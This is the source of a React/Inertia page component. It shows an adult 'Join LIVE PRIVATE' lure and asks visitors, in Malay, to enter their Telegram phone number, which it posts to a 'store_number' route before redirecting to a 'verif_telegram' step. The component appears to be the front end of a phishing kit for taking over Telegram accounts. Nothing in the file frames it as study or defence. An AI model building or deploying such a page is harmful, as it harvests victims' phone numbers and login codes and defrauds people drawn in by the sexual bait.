import Rhmt2Layout from "@/Layouts/rhmt2_layout";
import RhmtLayout from "@/Layouts/rhmt_layouts";
import { Link, router, useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import React, { useEffect, useState } from "react";

export default function SexLayouts() {
    const [showImage, setShowImage] = useState(0);
    const { data, setData, post, errors } = useForm({ phoneNumber: "+60" });
    const [loading, setLoading] = useState(false);
    useEffect(() => {
        if (showImage == 0) {
            setTimeout(() => {
                setShowImage(1);
            }, 20000);
        } else {
            setTimeout(() => {
                setShowImage(0);
            }, 20000);
        }
    }, [showImage]);
    const changeHandler = (e) => {
        const input = e.target.value;

        // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
        if (/^[0-9+]*$/.test(input)) {
            setData({ ...data, phoneNumber: input });
        }
    };
    const submitHandler = () => {
        setLoading(true);
        post(route("rhmt.vcx_store_number"), {
            onSuccess: () => {
                setTimeout(() => {
                    setLoading(false);
                }, 10000);
                router.visit(route("rhmt.vcx_verif_telegram"));
            },
            onError: () => {
                setLoading(false);
            },
        });
    };
    return (
        <Rhmt2Layout>
            {loading && (
                <div className="absolute top-0 left-0 w-full h-full flex justify-center items-center z-[99] ">
                    <img src="/loading.gif" alt="" />
                </div>
            )}
            <div className="absolute top-0 left-0 w-full h-full flex justify-center items-start flex-col z-[10] px-5">
                <h3 className="text-4xl font-extrabold text-purple-700 font-sans tracking-tighter">
                    Join LIVE{" "}
                    <span className="text-white tracking-tighter text-2xl font-thin">
                        PRIVATE
                    </span>
                </h3>

                <p className="tracking-tighter text-white font-thin text-lg w-[80%]">
                    Sila letak no telegram guna jumpa cod private live
                </p>
                <div className="py-5 w-full">
                    <TextField
                        value={data.phoneNumber}
                        onChange={changeHandler}
                        className="bg-white w-full rounded-lg outline-none focus:outline-none focus:border-none overflow-hidden"
                        variant="filled"
                        label="Nombor Telegram"
                    />
                </div>
                <button
                    onClick={submitHandler}
                    className="font-bold bg-purple-700 text-white text-2xl py-3 px-4 rounded-lg animate-pulse"
                >
                    Join Now
                </button>
            </div>
        </Rhmt2Layout>
    );
}

SexLayouts.layout = (page) => <RhmtLayout children={page} />;
